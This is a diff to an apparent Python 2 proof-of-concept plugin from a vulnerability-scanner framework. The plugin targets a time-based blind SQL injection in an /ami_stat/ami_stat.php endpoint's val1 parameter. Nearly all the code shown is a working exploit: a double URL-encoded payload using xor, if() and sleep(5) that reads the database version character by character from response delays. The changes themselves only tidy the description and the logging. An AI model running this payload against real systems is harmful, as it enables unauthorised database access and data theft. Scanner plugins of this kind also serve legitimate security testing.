@@ -11,7 +11,7 @@ class Vuln(ABVuln):
     level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
     disclosure_date = '2016-01-30'  # 漏洞公布时间
-    desc = '''模版漏洞描述
+    desc = '''
     注入点h /ami_stat/ami_stat.php?val2=undefined&val1=111*&type=search
     注入参数为val1
     正常检测不出来，需要doubleencode一下。
@@ -43,10 +43,9 @@ class Poc(ABPoc):
                     try:
                         key = " 11' xor if(ascii(mid(version(),{},1))={},sleep(5),1) and '1'='1".format(i,ord(p))
                         u = url.format(quote(quote(key)))
-                        req = requests.get(u,timeout=60)
+                        _req = requests.get(u,timeout=60)
                     except Exception,msg:
-                        print msg
-                    print key
+                        self.output.info('执行异常：{}'.format(msg))
                     if time.time() - start_time > 5:
                         user = user + p
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
